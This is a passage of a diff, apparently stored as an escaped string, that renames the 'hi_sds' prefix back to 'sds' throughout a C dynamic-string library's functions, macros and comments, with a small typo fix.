    +size_t sdsAllocSize(sds s) {\n+    size_t alloc = sdsalloc(s);\n+    return sdsHdrSize(s[-1])+alloc+1;\n\
    \ }\n \n /* Return the pointer of the actual SDS allocation (normally SDS strings\n\
    \  * are referenced by the start of the string buffer). */\n-void *hi_sdsAllocPtr(hisds\
    \ s) {\n-    return (void*) (s-hi_sdsHdrSize(s[-1]));\n+void *sdsAllocPtr(sds\
    \ s) {\n+    return (void*) (s-sdsHdrSize(s[-1]));\n }\n \n-/* Increment the hisds\
    \ length and decrements the left free space at the\n+/* Increment the sds length\
    \ and decrements the left free space at the\n  * end of the string according to\
    \ 'incr'. Also set the null term\n  * in the new end of the string.\n  *\n  *\
    \ This function is used in order to fix the string length after the\n- * user\
    \ calls hi_sdsMakeRoomFor(), writes something after the end of\n+ * user calls\
    \ sdsMakeRoomFor(), writes something after the end of\n  * the current string,\
    \ and finally needs to set the new length.\n  *\n  * Note: it is possible to use\
    \ a negative increment in order to\n  * right-trim the string.\n  *\n  * Usage\
    \ example:\n  *\n- * Using hi_sdsIncrLen() and hi_sdsMakeRoomFor() it is possible\
    \ to mount the\n+ * Using sdsIncrLen() and sdsMakeRoomFor() it is possible to\
    \ mount the\n  * following schema, to cat bytes coming from the kernel to the\
    \ end of an\n- * hisds string without copying into an intermediate buffer:\n+\
    \ * sds string without copying into an intermediate buffer:\n  *\n- * oldlen =\
    \ hi_hi_sdslen(s);\n- * s = hi_sdsMakeRoomFor(s, BUFFER_SIZE);\n+ * oldlen = sdslen(s);\n\
    + * s = sdsMakeRoomFor(s, BUFFER_SIZE);\n  * nread = read(fd, s+oldlen, BUFFER_SIZE);\n\
    \  * ... check for nread <= 0 and handle it ...\n- * hi_sdsIncrLen(s, nread);\n\
    + * sdsIncrLen(s, nread);\n  */\n-void hi_sdsIncrLen(hisds s, int incr) {\n+void\
    \ sdsIncrLen(sds s, int incr) {\n     unsigned char flags = s[-1];\n     size_t\
    \ len;\n-    switch(flags&HI_SDS_TYPE_MASK) {\n-        case HI_SDS_TYPE_5: {\n\
    +    switch(flags&SDS_TYPE_MASK) {\n+        case SDS_TYPE_5: {\n            \
    \ unsigned char *fp = ((unsigned char*)s)-1;\n-            unsigned char oldlen\
    \ = HI_SDS_TYPE_5_LEN(flags);\n+            unsigned char oldlen = SDS_TYPE_5_LEN(flags);\n\
    \             assert((incr > 0 && oldlen+incr < 32) || (incr < 0 && oldlen >=\
    \ (unsigned int)(-incr)));\n-            *fp = HI_SDS_TYPE_5 | ((oldlen+incr)\
    \ << HI_SDS_TYPE_BITS);\n+            *fp = SDS_TYPE_5 | ((oldlen+incr) << SDS_TYPE_BITS);\n\
    \             len = oldlen+incr;\n             break;\n         }\n-        case\
    \ HI_SDS_TYPE_8: {\n-            HI_SDS_HDR_VAR(8,s);\n+        case SDS_TYPE_8:\
    \ {\n+            SDS_HDR_VAR(8,s);\n             assert((incr >= 0 && sh->alloc-sh->len\
    \ >= incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n             len\
    \ = (sh->len += incr);\n             break;\n         }\n-        case HI_SDS_TYPE_16:\
    \ {\n-            HI_SDS_HDR_VAR(16,s);\n+        case SDS_TYPE_16: {\n+     \
    \       SDS_HDR_VAR(16,s);\n             assert((incr >= 0 && sh->alloc-sh->len\
    \ >= incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n             len\
    \ = (sh->len += incr);\n             break;\n         }\n-        case HI_SDS_TYPE_32:\
    \ {\n-            HI_SDS_HDR_VAR(32,s);\n+        case SDS_TYPE_32: {\n+     \
    \       SDS_HDR_VAR(32,s);\n             assert((incr >= 0 && sh->alloc-sh->len\
    \ >= (unsigned int)incr) || (incr < 0 && sh->len >= (unsigned int)(-incr)));\n\
    \             len = (sh->len += incr);\n             break;\n         }\n-   \
    \     case HI_SDS_TYPE_64: {\n-            HI_SDS_HDR_VAR(64,s);\n+        case\
    \ SDS_TYPE_64: {\n+            SDS_HDR_VAR(64,s);\n             assert((incr >=\
    \ 0 && sh->alloc-sh->len >= (uint64_t)incr) || (incr < 0 && sh->len >= (uint64_t)(-incr)));\n\
    \             len = (sh->len += incr);\n             break;\n@@ -352,83 +352,83\
    \ @@ void hi_sdsIncrLen(hisds s, int incr) {\n     s[len] = '\\0';\n }\n \n-/*\
    \ Grow the hisds to have the specified length. Bytes that were not part of\n-\
    \ * the original length of the hisds will be set to zero.\n+/* Grow the sds to\
    \ have the specified length. Bytes that were not part of\n+ * the original length\
    \ of the sds will be set to zero.\n  *\n  * if the specified length is smaller\
    \ than the current length, no operation\n  * is performed. */\n-hisds hi_sdsgrowzero(hisds\
    \ s, size_t len) {\n-    size_t curlen = hi_sdslen(s);\n+sds sdsgrowzero(sds s,\
    \ size_t len) {\n+    size_t curlen = sdslen(s);\n \n     if (len <= curlen) return\
    \ s;\n-    s = hi_sdsMakeRoomFor(s,len-curlen);\n+    s = sdsMakeRoomFor(s,len-curlen);\n\
    \     if (s == NULL) return NULL;\n \n     /* Make sure added region doesn't contain\
    \ garbage */\n     memset(s+curlen,0,(len-curlen+1)); /* also set trailing \\\
    0 byte */\n-    hi_sdssetlen(s, len);\n+    sdssetlen(s, len);\n     return s;\n\
    \ }\n \n /* Append the specified binary-safe string pointed by 't' of 'len' bytes\
    \ to the\n- * end of the specified hisds string 's'.\n+ * end of the specified\
    \ sds string 's'.\n  *\n- * After the call, the passed hisds string is no longer\
    \ valid and all the\n+ * After the call, the passed sds string is no longer valid\
    \ and all the\n  * references must be substituted with the new pointer returned\
    \ by the call. */\n-hisds hi_sdscatlen(hisds s, const void *t, size_t len) {\n\
    -    size_t curlen = hi_sdslen(s);\n+sds sdscatlen(sds s, const void *t, size_t\
    \ len) {\n+    size_t curlen = sdslen(s);\n \n-    s = hi_sdsMakeRoomFor(s,len);\n\
    +    s = sdsMakeRoomFor(s,len);\n     if (s == NULL) return NULL;\n     memcpy(s+curlen,\
    \ t, len);\n-    hi_sdssetlen(s, curlen+len);\n+    sdssetlen(s, curlen+len);\n\
    \     s[curlen+len] = '\\0';\n     return s;\n }\n \n-/* Append the specified\
    \ null termianted C string to the hisds string 's'.\n+/* Append the specified\
    \ null termianted C string to the sds string 's'.\n  *\n- * After the call, the\
    \ passed hisds string is no longer valid and all the\n+ * After the call, the\
    \ passed sds string is no longer valid and all the\n  * references must be substituted\
    \ with the new pointer returned by the call. */\n-hisds hi_sdscat(hisds s, const\
    \ char *t) {\n-    return hi_sdscatlen(s, t, strlen(t));\n+sds sdscat(sds s, const\
    \ char *t) {\n+    return sdscatlen(s, t, strlen(t));\n }\n \n-/* Append the specified\
    \ hisds 't' to the existing hisds 's'.\n+/* Append the specified sds 't' to the\
    \ existing sds 's'.\n  *\n- * After the call, the modified hisds string is no\
    \ longer valid and all the\n+ * After the call, the modified sds string is no\
    \ longer valid and all the\n  * references must be substituted with the new pointer\
    \ returned by the call. */\n-hisds hi_sdscatsds(hisds s, const hisds t) {\n- \
    \   return hi_sdscatlen(s, t, hi_sdslen(t));\n+sds sdscatsds(sds s, const sds\
    \ t) {\n+    return sdscatlen(s, t, sdslen(t));\n }\n \n-/* Destructively modify\
    \ the hisds string 's' to hold the specified binary\n+/* Destructively modify\
    \ the sds string 's' to hold the specified binary\n  * safe string pointed by\
    \ 't' of length 'len' bytes. */\n-hisds hi_sdscpylen(hisds s, const char *t, size_t\
    \ len) {\n-    if (hi_sdsalloc(s) < len) {\n-        s = hi_sdsMakeRoomFor(s,len-hi_sdslen(s));\n\
    +sds sdscpylen(sds s, const char *t, size_t len) {\n+    if (sdsalloc(s) < len)\
    \ {\n+        s = sdsMakeRoomFor(s,len-sdslen(s));\n         if (s == NULL) return\
    \ NULL;\n     }\n     memcpy(s, t, len);\n     s[len] = '\\0';\n-    hi_sdssetlen(s,\
    \ len);\n+    sdssetlen(s, len);\n     return s;\n }\n \n-/* Like hi_sdscpylen()\
    \ but 't' must be a null-termined string so that the length\n+/* Like sdscpylen()\
    \ but 't' must be a null-terminated string so that the length\n  * of the string\
    \ is obtained with strlen(). */\n-hisds hi_sdscpy(hisds s, const char *t) {\n\
    -    return hi_sdscpylen(s, t, strlen(t));\n+sds sdscpy(sds s, const char *t)\
    \ {\n+    return sdscpylen(s, t, strlen(t));\n }\n \n-/* Helper for hi_sdscatlonglong()\
    \ doing the actual number -> string\n+/* Helper for sdscatlonglong() doing the\
    \ actual number -> string\n  * conversion. 's' must point to a string with room\
    \ for at least\n- * HI_SDS_LLSTR_SIZE bytes.\n+ * SDS_LLSTR_SIZE bytes.\n  *\n\
    \  * The function returns the length of the null-terminated string\n  * representation\
    \ stored at 's'. */\n-#define HI_SDS_LLSTR_SIZE 21\n-int hi_sdsll2str(char *s,\
    \ long long value) {\n+#define SDS_LLSTR_SIZE 21\n+int sdsll2str(char *s, long\
    \ long value) {\n     char *p, aux;\n     unsigned long long v;\n     size_t l;\n\
    @@ -459,8 +459,8 @@ int hi_sdsll2str(char *s, long long value) {\n     return\
    \ l;\n }\n \n-/* Identical hi_sdsll2str(), but for unsigned long long type. */\n\
    -int hi_sdsull2str(char *s, unsigned long long v) {\n+/* Identical sdsll2str(),\
    \ but for unsigned long long type. */\n+int sdsull2str(char *s, unsigned long\
    \ long v) {\n     char *p, aux;\n     size_t l;\n \n@@ -488,27 +488,27 @@ int\
    \ hi_sdsull2str(char *s, unsigned long long v) {\n     return l;\n }\n \n-/* Create\
    \ an hisds string from a long long value. It is much faster than:\n+/* Create\
    \ an sds string from a long long value. It is much faster than:\n  *\n- * hi_sdscatprintf(hi_sdsempty(),\"\
    %lld\\n\", value);\n+ * sdscatprintf(sdsempty(),\"%lld\\n\", value);\n  */\n-hisds\
    \ hi_sdsfromlonglong(long long value) {\n-    char buf[HI_SDS_LLSTR_SIZE];\n-\
    \    int len = hi_sdsll2str(buf,value);\n+sds sdsfromlonglong(long long value)\
    \ {\n+    char buf[SDS_LLSTR_SIZE];\n+    int len = sdsll2str(buf,value);\n \n\
    -    return hi_sdsnewlen(buf,len);\n+    return sdsnewlen(buf,len);\n }\n \n-/*\
    \ Like hi_sdscatprintf() but gets va_list instead of being variadic. */\n-hisds\
    \ hi_sdscatvprintf(hisds s, const char *fmt, va_list ap) {\n+/* Like sdscatprintf()\
    \ but gets va_list instead of being variadic. */\n+sds sdscatvprintf(sds s, const\
    \ char *fmt, va_list ap) {\n     va_list cpy;\n     char staticbuf[1024], *buf\
    \ = staticbuf, *t;\n     size_t buflen = strlen(fmt)*2;\n \n     /* We try to\
    \ start using a static buffer for speed.\n      * If not possible we revert to\
    \ heap allocation. */\n     if (buflen > sizeof(staticbuf)) {\n-        buf =\
    \ hi_s_malloc(buflen);\n+        buf = s_malloc(buflen);\n         if (buf ==\
    \ NULL) return NULL;\n     } else {\n         buflen = sizeof(staticbuf);\n@@\
    \ -522,49 +522,49 @@ hisds hi_sdscatvprintf(hisds s, const char *fmt, va_list\
    \ ap) {\n         vsnprintf(buf, buflen, fmt, cpy);\n         va_end(cpy);\n \
    \        if (buf[buflen-2] != '\\0') {\n-            if (buf != staticbuf) hi_s_free(buf);\n\
    +            if (buf != staticbuf) s_free(buf);\n             buflen *= 2;\n-\
    \            buf = hi_s_malloc(buflen);\n+            buf = s_malloc(buflen);\n\
    \             if (buf == NULL) return NULL;\n             continue;\n        \
    \ }\n         break;\n     }\n \n     /* Finally concat the obtained string to\
    \ the SDS string and return it. */\n-    t = hi_sdscat(s, buf);\n-    if (buf\
    \ != staticbuf) hi_s_free(buf);\n+    t = sdscat(s, buf);\n+    if (buf != staticbuf)\
    \ s_free(buf);\n     return t;\n }\n \n-/* Append to the hisds string 's' a string\
    \ obtained using printf-alike format\n+/* Append to the sds string 's' a string\
    \ obtained using printf-alike format\n  * specifier.\n  *\n- * After the call,\
    \ the modified hisds string is no longer valid and all the\n+ * After the call,\
    \ the modified sds string is no longer valid and all the\n  * references must\
    \ be substituted with the new pointer returned by the call.\n  *\n  * Example:\n\
    \  *\n- * s = hi_sdsnew(\"Sum is: \");\n- * s = hi_sdscatprintf(s,\"%d+%d = %d\"\
    ,a,b,a+b).\n+ * s = sdsnew(\"Sum is: \");\n+ * s = sdscatprintf(s,\"%d+%d = %d\"\
    ,a,b,a+b).\n  *\n  * Often you need to create a string from scratch with the printf-alike\n\
    - * format. When this is the need, just use hi_sdsempty() as the target string:\n\
    + * format. When this is the need, just use sdsempty() as the target string:\n\
    \  *\n- * s = hi_sdscatprintf(hi_sdsempty(), \"... your format ...\", args);\n\
    + * s = sdscatprintf(sdsempty(), \"... your format ...\", args);\n  */\n-hisds\
    \ hi_sdscatprintf(hisds s, const char *fmt, ...) {\n+sds sdscatprintf(sds s, const\
    \ char *fmt, ...) {\n     va_list ap;\n     char *t;\n     va_start(ap, fmt);\n\
    -    t = hi_sdscatvprintf(s,fmt,ap);\n+    t = sdscatvprintf(s,fmt,ap);\n    \
    \ va_end(ap);\n     return t;\n }\n \n-/* This function is similar to hi_sdscatprintf,\
    \ but much faster as it does\n+/* This function is similar to sdscatprintf, but\
    \ much faster as it does\n  * not rely on sprintf() family functions implemented\
    \ by the libc that\n- * are often very slow. Moreover directly handling the hisds\
    \ string as\n+ * are often very slow. Moreover directly handling the sds string\
    \ as\n  * new data is concatenated provides a performance improvement.\n  *\n\
    \  * However this function only handles an incompatible subset of printf-alike\n\
    @@ -578,22 +578,22 @@ hisds hi_sdscatprintf(hisds s, const char *fmt, ...) {\n\
    \  * %U - 64 bit unsigned integer (unsigned long long, uint64_t)\n  * %% - Verbatim\
    \ \"%\" character.\n  */\n-hisds hi_sdscatfmt(hisds s, char const *fmt, ...) {\n\
    +sds sdscatfmt(sds s, char const *fmt, ...) {\n     const char *f = fmt;\n   \
    \  int i;\n     va_list ap;\n \n     va_start(ap,fmt);\n-    i = hi_sdslen(s);\
    \ /* Position of the next byte to write to dest str. */\n+    i = sdslen(s); /*\
    \ Position of the next byte to write to dest str. */\n     while(*f) {\n     \
    \    char next, *str;\n         size_t l;\n         long long num;\n         unsigned\
    \ long long unum;\n \n         /* Make sure there is always space for at least\
    \ 1 char. */\n-        if (hi_sdsavail(s)==0) {\n-            s = hi_sdsMakeRoomFor(s,1);\n\
    +        if (sdsavail(s)==0) {\n+            s = sdsMakeRoomFor(s,1);\n      \
    \       if (s == NULL) goto fmt_error;\n         }\n \n@@ -605,13 +605,13 @@ hisds\
    \ hi_sdscatfmt(hisds s, char const *fmt, ...) {\n             case 's':\n    \
    \         case 'S':\n                 str = va_arg(ap,char*);\n-             \
    \   l = (next == 's') ? strlen(str) : hi_sdslen(str);\n-                if (hi_sdsavail(s)\
    \ < l) {\n-                    s = hi_sdsMakeRoomFor(s,l);\n+                l\
    \ = (next == 's') ? strlen(str) : sdslen(str);\n+                if (sdsavail(s)\
    \ < l) {\n+                    s = sdsMakeRoomFor(s,l);\n                    \
    \ if (s == NULL) goto fmt_error;\n                 }\n                 memcpy(s+i,str,l);\n\
    -                hi_sdsinclen(s,l);\n+                sdsinclen(s,l);\n      \
    \           i += l;\n                 break;\n             case 'i':\n@@ -621,14\
    \ +621,14 @@ hisds hi_sdscatfmt(hisds s, char const *fmt, ...) {\n           \
    \      else\n                     num = va_arg(ap,long long);\n              \
    \   {\n-                    char buf[HI_SDS_LLSTR_SIZE];\n-                  \
    \  l = hi_sdsll2str(buf,num);\n-                    if (hi_sdsavail(s) < l) {\n\
    -                        s = hi_sdsMakeRoomFor(s,l);\n+                    char\
    \ buf[SDS_LLSTR_SIZE];\n+                    l = sdsll2str(buf,num);\n+      \
    \              if (sdsavail(s) < l) {\n+                        s = sdsMakeRoomFor(s,l);\n\
    \                         if (s == NULL) goto fmt_error;\n                   \
    \  }\n                     memcpy(s+i,buf,l);\n-                    hi_sdsinclen(s,l);\n\
    +                    sdsinclen(s,l);\n                     i += l;\n         \
    \        }\n                 break;\n@@ -639,26 +639,26 @@ hisds hi_sdscatfmt(hisds\
    \ s, char const *fmt, ...) {\n                 else\n                     unum\
    \ = va_arg(ap,unsigned long long);\n                 {\n-                    char\
    \ buf[HI_SDS_LLSTR_SIZE];\n-                    l = hi_sdsull2str(buf,unum);\n\
    -                    if (hi_sdsavail(s) < l) {\n-                        s = hi_sdsMakeRoomFor(s,l);\n\
    +                    char buf[SDS_LLSTR_SIZE];\n+                    l = sdsull2str(buf,unum);\n\
    +                    if (sdsavail(s) < l) {\n+                        s = sdsMakeRoomFor(s,l);\n\
    \                         if (s == NULL) goto fmt_error;\n                   \
    \  }\n                     memcpy(s+i,buf,l);\n-                    hi_sdsinclen(s,l);\n\
    +                    sdsinclen(s,l);\n                     i += l;\n         \
    \        }\n                 break;\n             default: /* Handle %% and generally\
    \ %<unknown>. */\n                 s[i++] = next;\n-                hi_sdsinclen(s,1);\n\
    +                sdsinclen(s,1);\n                 break;\n             }\n  \
    \           break;\n         default:\n             s[i++] = *f;\n-          \
    \  hi_sdsinclen(s,1);\n+            sdsinclen(s,1);\n             break;\n   \
    \      }\n         f++;\n@@ -677,29 +677,29 @@ hisds hi_sdscatfmt(hisds s, char\
    \ const *fmt, ...) {\n /* Remove the part of the string from left and from right\
    \ composed just of\n  * contiguous characters found in 'cset', that is a null\
    \ terminted C string.\n  *\n- * After the call, the modified hisds string is no\
    \ longer valid and all the\n+ * After the call, the modified sds string is no\
    \ longer valid and all the\n  * references must be substituted with the new pointer\
    \ returned by the call.\n  *\n  * Example:\n  *\n- * s = hi_sdsnew(\"AA...AA.a.aa.aHelloWorld\
    \     :::\");\n- * s = hi_sdstrim(s,\"Aa. :\");\n+ * s = sdsnew(\"AA...AA.a.aa.aHelloWorld\
    \     :::\");\n+ * s = sdstrim(s,\"Aa. :\");\n  * printf(\"%s\\n\", s);\n  *\n\
    \  * Output will be just \"Hello World\".\n  */\n-hisds hi_sdstrim(hisds s, const\
    \ char *cset) {\n+sds sdstrim(sds s, const char *cset) {\n     char *start, *end,\
    \ *sp, *ep;\n     size_t len;\n \n     sp = start = s;\n-    ep = end = s+hi_sdslen(s)-1;\n\
    +    ep = end = s+sdslen(s)-1;\n     while(sp <= end && strchr(cset, *sp)) sp++;\n\
    \     while(ep > sp && strchr(cset, *ep)) ep--;\n     len = (sp > ep) ? 0 : ((ep-sp)+1);\n\
    \     if (s != sp) memmove(s, sp, len);\n     s[len] = '\\0';\n-    hi_sdssetlen(s,len);\n\
    +    sdssetlen(s,len);\n     return s;\n }\n \n@@ -715,16 +715,16 @@ hisds hi_sdstrim(hisds\
    \ s, const char *cset) {\n  * The string is modified in-place.\n  *\n  * Return\
    \ value:\n- * -1 (error) if hi_sdslen(s) is larger than maximum positive ssize_t\
    \ value.\n+ * -1 (error) if sdslen(s) is larger than maximum positive ssize_t\
    \ value.\n  *  0 on success.\n  *\n  * Example:\n  *\n- * s = hi_sdsnew(\"Hello\
    \ World\");\n- * hi_sdsrange(s,1,-1); => \"ello World\"\n+ * s = sdsnew(\"Hello\
    \ World\");\n+ * sdsrange(s,1,-1); => \"ello World\"\n  */\n-int hi_sdsrange(hisds\
    \ s, ssize_t start, ssize_t end) {\n-    size_t newlen, len = hi_sdslen(s);\n\
    +int sdsrange(sds s, ssize_t start, ssize_t end) {\n+    size_t newlen, len =\
    \ sdslen(s);\n     if (len > SSIZE_MAX) return -1;\n \n     if (len == 0) return\
    \ 0;\n@@ -749,25 +749,25 @@ int hi_sdsrange(hisds s, ssize_t start, ssize_t end)\
    \ {\n     }\n     if (start && newlen) memmove(s, s+start, newlen);\n     s[newlen]\
    \ = 0;\n-    hi_sdssetlen(s,newlen);\n+    sdssetlen(s,newlen);\n     return 0;\n\
    \ }\n \n-/* Apply tolower() to every character of the hisds string 's'. */\n-void\
    \ hi_sdstolower(hisds s) {\n-    int len = hi_sdslen(s), j;\n+/* Apply tolower()\
    \ to every character of the sds string 's'. */\n+void sdstolower(sds s) {\n+ \
    \   int len = sdslen(s), j;\n \n     for (j = 0; j < len; j++) s[j] = tolower(s[j]);\n\
    \ }\n \n-/* Apply toupper() to every character of the hisds string 's'. */\n-void\
    \ hi_sdstoupper(hisds s) {\n-    int len = hi_sdslen(s), j;\n+/* Apply toupper()\
    \ to every character of the sds string 's'. */\n+void sdstoupper(sds s) {\n+ \
    \   int len = sdslen(s), j;\n \n     for (j = 0; j < len; j++) s[j] = toupper(s[j]);\n\
    \ }\n \n-/* Compare two hisds strings s1 and s2 with memcmp().\n+/* Compare two\
    \ sds strings s1 and s2 with memcmp().\n  *\n  * Return value:\n  *\n@@ -778,41\
    \ +778,41 @@ void hi_sdstoupper(hisds s) {\n  * If two strings share exactly the\
    \ same prefix, but one of the two has\n  * additional characters, the longer string\
    \ is considered to be greater than\n  * the smaller one. */\n-int hi_sdscmp(const\
    \ hisds s1, const hisds s2) {\n+int sdscmp(const sds s1, const sds s2) {\n   \
    \  size_t l1, l2, minlen;\n     int cmp;\n \n-    l1 = hi_sdslen(s1);\n-    l2\
    \ = hi_sdslen(s2);\n+    l1 = sdslen(s1);\n+    l2 = sdslen(s2);\n     minlen\
    \ = (l1 < l2) ? l1 : l2;\n     cmp = memcmp(s1,s2,minlen);\n     if (cmp == 0)\
    \ return l1-l2;\n     return cmp;\n }\n \n /* Split 's' with separator in 'sep'.\
    \ An array\n- * of hisds strings is returned. *count will be set\n+ * of sds strings\
    \ is returned. *count will be set\n  * by reference to the number of tokens returned.\n\
    \  *\n  * On out of memory, zero length string, zero length\n  * separator, NULL\
    \ is returned.\n  *\n  * Note that 'sep' is able to split a string using\n  *\
    \ a multi-character separator. For example\n- * hi_sdssplit(\"foo_-_bar\",\"_-_\"\
    ); will return two\n+ * sdssplit(\"foo_-_bar\",\"_-_\"); will return two\n  *\
    \ elements \"foo\" and \"bar\".\n  *\n  * This version of the function is binary-safe\
    \ but\n- * requires length arguments. hi_sdssplit() is just the\n+ * requires\
    \ length arguments. sdssplit() is just the\n  * same function but for zero-terminated\
    \ strings.\n  */\n-hisds *hi_sdssplitlen(const char *s, int len, const char *sep,\
    \ int seplen, int *count) {\n+sds *sdssplitlen(const char *s, int len, const char\
    \ *sep, int seplen, int *count) {\n     int elements = 0, slots = 5, start = 0,\
    \ j;\n-    hisds *tokens;\n+    sds *tokens;\n \n     if (seplen < 1 || len <\
    \ 0) return NULL;\n \n-    tokens = hi_s_malloc(sizeof(hisds)*slots);\n+    tokens\
    \ = s_malloc(sizeof(sds)*slots);\n     if (tokens == NULL) return NULL;\n \n \
    \    if (len == 0) {\n@@ -822,24 +822,24 @@ hisds *hi_sdssplitlen(const char *s,\
    \ int len, const char *sep, int seplen, int *\n     for (j = 0; j < (len-(seplen-1));\
    \ j++) {\n         /* make sure there is room for the next element and the final\
    \ one */\n         if (slots < elements+2) {\n-            hisds *newtokens;\n\
    +            sds *newtokens;\n \n             slots *= 2;\n-            newtokens\
    \ = hi_s_realloc(tokens,sizeof(hisds)*slots);\n+            newtokens = s_realloc(tokens,sizeof(sds)*slots);\n\
    \             if (newtokens == NULL) goto cleanup;\n             tokens = newtokens;\n\
    \         }\n         /* search the separator */\n         if ((seplen == 1 &&\
    \ *(s+j) == sep[0]) || (memcmp(s+j,sep,seplen) == 0)) {\n-            tokens[elements]\
    \ = hi_sdsnewlen(s+start,j-start);\n+            tokens[elements] = sdsnewlen(s+start,j-start);\n\
    \             if (tokens[elements] == NULL) goto cleanup;\n             elements++;\n\
    \             start = j+seplen;\n             j = j+seplen-1; /* skip the separator\
    \ */\n         }\n     }\n     /* Add the final element. We are sure there is\
    \ room in the tokens array. */\n-    tokens[elements] = hi_sdsnewlen(s+start,len-start);\n\
    +    tokens[elements] = sdsnewlen(s+start,len-start);\n     if (tokens[elements]\
    \ == NULL) goto cleanup;\n     elements++;\n     *count = elements;\n@@ -848,55\
    \ +848,55 @@ hisds *hi_sdssplitlen(const char *s, int len, const char *sep, int\
    \ seplen, int *\n cleanup:\n     {\n         int i;\n-        for (i = 0; i <\
    \ elements; i++) hi_sdsfree(tokens[i]);\n-        hi_s_free(tokens);\n+      \
    \  for (i = 0; i < elements; i++) sdsfree(tokens[i]);\n+        s_free(tokens);\n\
    \         *count = 0;\n         return NULL;\n     }\n }\n \n-/* Free the result\
    \ returned by hi_sdssplitlen(), or do nothing if 'tokens' is NULL. */\n-void hi_sdsfreesplitres(hisds\
    \ *tokens, int count) {\n+/* Free the result returned by sdssplitlen(), or do\
    \ nothing if 'tokens' is NULL. */\n+void sdsfreesplitres(sds *tokens, int count)\
    \ {\n     if (!tokens) return;\n     while(count--)\n-        hi_sdsfree(tokens[count]);\n\
    -    hi_s_free(tokens);\n+        sdsfree(tokens[count]);\n+    s_free(tokens);\n\
    \ }\n \n-/* Append to the hisds string \"s\" an escaped string representation\
    \ where\n+/* Append to the sds string \"s\" an escaped string representation where\n\
    \  * all the non-printable characters (tested with isprint()) are turned into\n\
    \  * escapes in the form \"\\n\\r\\a....\" or \"\\x<hex-number>\".\n  *\n- * After\
    \ the call, the modified hisds string is no longer valid and all the\n+ * After\
    \ the call, the modified sds string is no longer valid and all the\n  * references\
    \ must be substituted with the new pointer returned by the call. */\n-hisds hi_sdscatrepr(hisds\
    \ s, const char *p, size_t len) {\n-    s = hi_sdscatlen(s,\"\\\"\",1);\n+sds\
    \ sdscatrepr(sds s, const char *p, size_t len) {\n+    s = sdscatlen(s,\"\\\"\"\
    ,1);\n     while(len--) {\n         switch(*p) {\n         case '\\\\':\n    \
    \     case '\"':\n-            s = hi_sdscatprintf(s,\"\\\\%c\",*p);\n+      \
    \      s = sdscatprintf(s,\"\\\\%c\",*p);\n             break;\n-        case\
    \ '\\n': s = hi_sdscatlen(s,\"\\\\n\",2); break;\n-        case '\\r': s = hi_sdscatlen(s,\"\
    \\\\r\",2); break;\n-        case '\\t': s = hi_sdscatlen(s,\"\\\\t\",2); break;\n\
    -        case '\\a': s = hi_sdscatlen(s,\"\\\\a\",2); break;\n-        case '\\\
    b': s = hi_sdscatlen(s,\"\\\\b\",2); break;\n+        case '\\n': s = sdscatlen(s,\"\
    \\\\n\",2); break;\n+        case '\\r': s = sdscatlen(s,\"\\\\r\",2); break;\n\
    +        case '\\t': s = sdscatlen(s,\"\\\\t\",2); break;\n+        case '\\a':\
    \ s = sdscatlen(s,\"\\\\a\",2); break;\n+        case '\\b': s = sdscatlen(s,\"\
    \\\\b\",2); break;\n         default:\n             if (isprint(*p))\n-      \
    \          s = hi_sdscatprintf(s,\"%c\",*p);\n+                s = sdscatprintf(s,\"\
    %c\",*p);\n             else\n-                s = hi_sdscatprintf(s,\"\\\\x%02x\"\
    ,(unsigned char)*p);\n+                s = sdscatprintf(s,\"\\\\x%02x\",(unsigned\
    \ char)*p);\n             break;\n         }\n         p++;\n     }\n-    return\
    \ hi_sdscatlen(s,\"\\\"\",1);\n+    return sdscatlen(s,\"\\\"\",1);\n }\n \n-/*\
    \ Helper function for hi_sdssplitargs() that converts a hex digit into an\n+/*\
    \ Helper function for sdssplitargs() that converts a hex digit into an\n  * integer\
    \ from 0 to 15 */\n-static int hi_hex_digit_to_int(char c) {\n+int hex_digit_to_int(char\
    \ c) {\n     switch(c) {\n     case '0': return 0;\n     case '1': return 1;\n\
    @@ -924,20 +924,20 @@ static int hi_hex_digit_to_int(char c) {\n  * foo bar \"\
    newline are supported\\n\" and \"\\xff\\x00otherstuff\"\n  *\n  * The number of\
    \ arguments is stored into *argc, and an array\n- * of hisds is returned.\n+ *\
    \ of sds is returned.\n  *\n- * The caller should free the resulting array of\
    \ hisds strings with\n- * hi_sdsfreesplitres().\n+ * The caller should free the\
    \ resulting array of sds strings with\n+ * sdsfreesplitres().\n  *\n- * Note that\
    \ hi_sdscatrepr() is able to convert back a string into\n- * a quoted string in\
    \ the same format hi_sdssplitargs() is able to parse.\n+ * Note that sdscatrepr()\
    \ is able to convert back a string into\n+ * a quoted string in the same format\
    \ sdssplitargs() is able to parse.\n  *\n  * The function returns the allocated\
    \ tokens on success, even when the\n  * input string is empty, or NULL if the\
    \ input contains unbalanced\n  * quotes or closed quotes followed by non space\
    \ characters\n  * as in: \"foo\"bar or \"foo'\n  */\n-hisds *hi_sdssplitargs(const\
    \ char *line, int *argc) {\n+sds *sdssplitargs(const char *line, int *argc) {\n\
    \     const char *p = line;\n     char *current = NULL;\n     char **vector =\
    \ NULL;\n@@ -952,7 +952,7 @@ hisds *hi_sdssplitargs(const char *line, int *argc)\
    \ {\n             int insq=0; /* set to 1 if we are in 'single quotes' */\n  \
    \           int done=0;\n \n-            if (current == NULL) current = hi_sdsempty();\n\
    +            if (current == NULL) current = sdsempty();\n             while(!done)\
    \ {\n                 if (inq) {\n                     if (*p == '\\\\' && *(p+1)\
    \ == 'x' &&\n@@ -961,9 +961,9 @@ hisds *hi_sdssplitargs(const char *line, int\
    \ *argc) {\n                     {\n                         unsigned char byte;\n\
    \ \n-                        byte = (hi_hex_digit_to_int(*(p+2))*16)+\n-     \
    \                           hi_hex_digit_to_int(*(p+3));\n-                  \
    \      current = hi_sdscatlen(current,(char*)&byte,1);\n+                    \
    \    byte = (hex_digit_to_int(*(p+2))*16)+\n+                                hex_digit_to_int(*(p+3));\n\
    +                        current = sdscatlen(current,(char*)&byte,1);\n      \
    \                   p += 3;\n                     } else if (*p == '\\\\' && *(p+1))\
    \ {\n                         char c;\n@@ -977,7 +977,7 @@ hisds *hi_sdssplitargs(const\
    \ char *line, int *argc) {\n                         case 'a': c = '\\a'; break;\n\
    \                         default: c = *p; break;\n                         }\n\
    -                        current = hi_sdscatlen(current,&c,1);\n+            \
    \            current = sdscatlen(current,&c,1);\n                     } else if\
    \ (*p == '\"') {\n                         /* closing quote must be followed by\
    \ a space or\n                          * nothing at all. */\n@@ -987,12 +987,12\
    \ @@ hisds *hi_sdssplitargs(const char *line, int *argc) {\n                 \
